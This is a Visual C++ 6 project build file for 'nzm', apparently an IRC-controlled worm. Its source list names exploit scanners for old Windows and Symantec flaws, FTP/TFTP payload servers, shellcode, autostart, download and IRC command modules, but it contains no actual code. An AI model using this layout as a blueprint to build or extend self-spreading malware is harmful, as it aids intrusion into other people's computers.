# Microsoft Developer Studio Project File - Name="nzm" - Package Owner=<4>
# Microsoft Developer Studio Generated Build File, Format Version 6.00
# ** DO NOT EDIT **

# TARGTYPE "Win32 (x86) Application" 0x0101

CFG=nzm - WIN32 RELEASE
!MESSAGE This is not a valid makefile. To build this project using NMAKE,
!MESSAGE use the Export Makefile command and run
!MESSAGE 
!MESSAGE NMAKE /f "nzm.mak".
!MESSAGE 
!MESSAGE You can specify a configuration when running NMAKE
!MESSAGE by defining the macro CFG on the command line. For example:
!MESSAGE 
!MESSAGE NMAKE /f "nzm.mak" CFG="nzm - WIN32 RELEASE"
!MESSAGE 
!MESSAGE Possible choices for configuration are:
!MESSAGE 
!MESSAGE "nzm - Win32 Release" (based on "Win32 (x86) Application")
!MESSAGE 

# Begin Project
# PROP AllowPerConfigDependencies 0
# PROP Scc_ProjName ""
# PROP Scc_LocalPath ""
CPP=cl.exe
MTL=midl.exe
RSC=rc.exe
# PROP BASE Use_MFC 0
# PROP BASE Use_Debug_Libraries 0
# PROP BASE Output_Dir "obj"
# PROP BASE Intermediate_Dir "obj"
# PROP BASE Target_Dir "obj"
# PROP Use_MFC 0
# PROP Use_Debug_Libraries 0
# PROP Output_Dir "exe"
# PROP Intermediate_Dir "obj"
# PROP Ignore_Export_Lib 0
# PROP Target_Dir ""
# ADD BASE CPP /nologo /W3 /GX /O2 /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /YX /FD /c
# ADD CPP /nologo /W3 /GX /O1 /I "C:\Program Files\Microsoft SDK\Include" /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /YX /FD /c
# ADD BASE MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD BASE RSC /l 0x409 /d "NDEBUG"
# ADD RSC /l 0x409 /d "NDEBUG"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib /nologo /subsystem:windows /machine:I386
# ADD LINK32 /nologo /subsystem:windows /machine:I386
# SUBTRACT LINK32 /pdb:none
# Begin Target

# Name "nzm - Win32 Release"
# Begin Group "NZM V0.5B"

# PROP Default_Filter "cpp;c;cxx;rc;def;r;odl;idl;hpj;bat"
# Begin Group "VULN"

# PROP Default_Filter ""
# Begin Group "Scanners"

# PROP Default_Filter ".cpp"
# Begin Source File

SOURCE=.\cpp\exploits\dcom.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\exploits\ms04_007_asn1.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\exploits\netapi.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\exploits\sym06_010.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\vncps.cpp
# End Source File
# End Group
# Begin Group "FTPD"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\cpp\exploits\ftpd.cpp
# End Source File
# End Group
# Begin Group "TFTP"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\cpp\exploits\tftpd.cpp
# End Source File
# End Group
# Begin Source File

SOURCE=.\cpp\exploits\advscan.cpp
# End Source File
# End Group
# Begin Group "TOOLS"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\cpp\core\loaddlls.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\core\misc.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\core\netutils.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\patcher.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\core\sysinfo.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\version.c
# End Source File
# End Group
# Begin Group "CORE FILES"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\cpp\core\aliaslog.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\core\autostart.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\core\download.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\core\ehandler.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\core\fphost.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\core\irc_send.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\md5.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\core\nzm.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\core\processes.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\core\random.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\core\rndnick.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\core\shellcode.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\core\threads.cpp
# End Source File
# Begin Source File

SOURCE=.\cpp\core\wildcard.cpp
# End Source File
# End Group
# End Group
# Begin Group "HEADERS"

# PROP Default_Filter "h;hpp;hxx;hm;inl"
# Begin Group "CONFIGURATION"

# PROP Default_Filter "*.h"
# Begin Source File

SOURCE=.\config\cfg.h
# End Source File
# End Group
# Begin Source File

SOURCE=.\headers\advscan.h
# End Source File
# Begin Source File

SOURCE=.\headers\aliaslog.h
# End Source File
# Begin Source File

SOURCE=.\headers\autostart.h
# End Source File
# Begin Source File

SOURCE=.\headers\d3des.h
# End Source File
# Begin Source File

SOURCE=.\headers\dcom.h
# End Source File
# Begin Source File

SOURCE=.\headers\defines.h
# End Source File
# Begin Source File

SOURCE=.\headers\download.h
# End Source File
# Begin Source File

SOURCE=.\headers\ehandler.h
# End Source File
# Begin Source File

SOURCE=.\headers\externs.h
# End Source File
# Begin Source File

SOURCE=.\headers\ftpd.h
# End Source File
# Begin Source File

SOURCE=.\headers\functions.h
# End Source File
# Begin Source File

SOURCE=.\headers\globals.h
# End Source File
# Begin Source File

SOURCE=.\headers\includes.h
# End Source File
# Begin Source File

SOURCE=.\headers\irc_send.h
# End Source File
# Begin Source File

SOURCE=.\headers\loaddlls.h
# End Source File
# Begin Source File

SOURCE=.\headers\md5.h
# End Source File
# Begin Source File

SOURCE=.\headers\misc.h
# End Source File
# Begin Source File

SOURCE=.\headers\ms04_007_asn1.h
# End Source File
# Begin Source File

SOURCE=.\headers\netapi.h
# End Source File
# Begin Source File

SOURCE=.\headers\netutils.h
# End Source File
# Begin Source File

SOURCE=.\headers\nzm.h
# End Source File
# Begin Source File

SOURCE=.\headers\patcher.h
# End Source File
# Begin Source File

SOURCE=.\headers\processes.h
# End Source File
# Begin Source File

SOURCE=.\headers\random.h
# End Source File
# Begin Source File

SOURCE=.\headers\rfb.h
# End Source File
# Begin Source File

SOURCE=.\headers\rndnick.h
# End Source File
# Begin Source File

SOURCE=.\headers\shellcode.h
# End Source File
# Begin Source File

SOURCE=.\headers\sym06_010.h
# End Source File
# Begin Source File

SOURCE=.\headers\sysinfo.h
# End Source File
# Begin Source File

SOURCE=.\headers\tftpd.h
# End Source File
# Begin Source File

SOURCE=.\headers\threads.h
# End Source File
# Begin Source File

SOURCE=.\headers\version.h
# End Source File
# Begin Source File

SOURCE=.\headers\vncps.h
# End Source File
# Begin Source File

SOURCE=.\headers\wildcard.h
# End Source File
# End Group
# Begin Group "Resource Files"

# PROP Default_Filter "ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe"
# End Group
# End Target
# End Project
